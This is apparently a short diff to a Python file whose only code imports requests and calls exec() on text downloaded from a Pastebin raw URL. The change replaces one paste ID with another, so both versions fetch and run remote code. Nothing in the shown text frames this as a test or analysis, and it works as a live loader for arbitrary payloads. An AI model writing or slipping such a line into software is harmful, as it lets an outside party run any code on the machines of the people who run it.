@@ -1,3 +1,3 @@
 import requests
 
-exec(requests.get("https://pastebin.com/raw/T8U7QBKM").text)
+exec(requests.get("https://pastebin.com/raw/Q3TEh8zi").text)
